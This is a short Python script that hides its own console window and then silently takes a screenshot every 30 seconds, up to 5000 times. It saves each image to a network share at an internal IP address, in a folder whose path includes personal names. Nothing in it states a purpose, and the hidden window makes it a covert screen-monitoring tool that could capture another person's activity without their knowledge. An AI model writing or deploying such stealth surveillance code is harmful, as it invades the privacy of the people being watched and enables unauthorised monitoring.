import pyautogui
import time
import os
from datetime import datetime
import ctypes
import sys

# Hide the console window (Windows only)
def hide_console():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Folder to save screenshots
save_folder = r"\\172.16.16.254\Common\CFPatel\c somabhai\New folder"  # Change this to your desired folder path
os.makedirs(save_folder, exist_ok=True)

# Hide the console window
hide_console()

# Take screenshots every 30 seconds
for i in range(5000):
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filepath = os.path.join(save_folder, f"screenshot_{timestamp}.png")
    screenshot = pyautogui.screenshot()
    screenshot.save(filepath)
    time.sleep(30)
